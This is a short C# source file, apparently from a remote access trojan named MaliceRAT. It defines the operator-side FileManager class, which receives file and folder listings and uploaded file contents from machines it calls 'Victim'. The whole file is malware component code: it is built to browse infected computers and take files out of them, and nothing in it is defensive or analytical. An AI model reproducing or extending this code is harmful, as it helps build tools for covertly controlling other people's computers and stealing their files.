using System;

namespace MaliceRAT.RatServer.Features
{
    public class FileManager
    {
        #region Events
        public event Action<Victim, string> FilesAndFoldersReceived;
        public event Action<Victim, string, string> FileUploaded;
        #endregion

        #region Variables
        private Server server;
        #endregion

        #region Constructor
        public FileManager(Server server)
        {
            this.server = server;
            server.MessageReceived += OnMessageReceived;
        }
        #endregion

        private void OnMessageReceived(Victim victim, dynamic message)
        {
            if (message["type"] == "fm_list")
            {
                string filesAndFoldersJson = message["filesAndFolders"];
                FilesAndFoldersReceived?.Invoke(victim, filesAndFoldersJson);
            }
            else if (message["type"] == "fm_upload")
            {
                string name = message["name"];
                string data = message["data"];
                FileUploaded?.Invoke(victim, name, data);
            }
        }
    }
}